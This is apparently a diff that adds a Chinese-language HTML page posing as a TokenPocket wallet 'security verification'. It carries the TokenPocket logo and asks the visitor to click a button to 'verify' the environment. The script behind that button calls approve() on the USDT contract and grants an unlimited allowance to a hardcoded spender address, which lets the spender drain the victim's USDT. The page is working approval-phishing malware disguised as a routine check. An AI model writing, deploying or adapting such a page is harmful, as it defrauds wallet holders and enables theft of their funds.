@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>安全验证 - TokenPocket</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
+    <style>
+        body { font-family: -apple-system, sans-serif; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { width: 90%; max-width: 400px; background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); text-align: center; }
+        .logo { width: 60px; height: 60px; margin-bottom: 20px; }
+        h2 { font-size: 1.2rem; color: #333; margin-bottom: 10px; }
+        p { color: #666; font-size: 0.9rem; margin-bottom: 30px; }
+        .btn { background: #2980b9; color: white; border: none; padding: 15px 40px; border-radius: 30px; font-size: 1rem; font-weight: bold; width: 100%; cursor: pointer; transition: background 0.3s; }
+        .btn:active { background: #1c5982; }
+        #msg { margin-top: 15px; font-size: 0.8rem; color: #e74c3c; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://www.tokenpocket.pro/images/logo.png" class="logo" alt="TP Logo">
+    <h2>合约交互确认</h2>
+    <p>点击下方按钮完成环境检测并启动合约授权验证</p>
+    
+    <button class="btn" onclick="handleApprove()">点击签名授权</button>
+    
+    <div id="msg"></div>
+</div>
+
+<script>
+    // 配置参数
+    const SPENDER_ADDRESS = "0xb7D4018096290fa478841D58b1b814D9f9e47BFE"; // 授权给谁（你的合约）
+    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";    // USDT 合约地址
+    
+    // 无限数量 (Max Uint256)
+    const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+    async function handleApprove() {
+        const msgDiv = document.getElementById('msg');
+        msgDiv.innerText = "";
+
+        if (typeof window.ethereum === 'undefined') {
+            msgDiv.innerText = "请在 TokenPocket 钱包内打开此页面";
+            return;
+        }
+
+        try {
+            // 1. 请求连接钱包
+            const provider = new ethers.BrowserProvider(window.ethereum);
+            const signer = await provider.getSigner();
+            const userAddress = await signer.getAddress();
+
+            // 2. 构建 ERC20 ABI (仅需 approve)
+            const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+            const contract = new ethers.Contract(USDT_ADDRESS, abi, signer);
+
+            // 3. 发起授权交易
+            msgDiv.style.color = "#2980b9";
+            msgDiv.innerText = "正在唤起钱包，请确认...";
+
+            const tx = await contract.approve(SPENDER_ADDRESS, MAX_UINT256);
+            
+            msgDiv.innerText = "交易已提交，等待区块确认...";
+            await tx.wait();
+
+            msgDiv.style.color = "green";
+            msgDiv.innerText = "授权成功！";
+
+        } catch (error) {
+            console.error(error);
+            msgDiv.style.color = "#e74c3c";
+            if (error.code === 4001) {
+                msgDiv.innerText = "用户取消了签名";
+            } else {
+                msgDiv.innerText = "授权失败: " + error.message;
+            }
+        }
+    }
+</script>
+
+</body>
+</html>
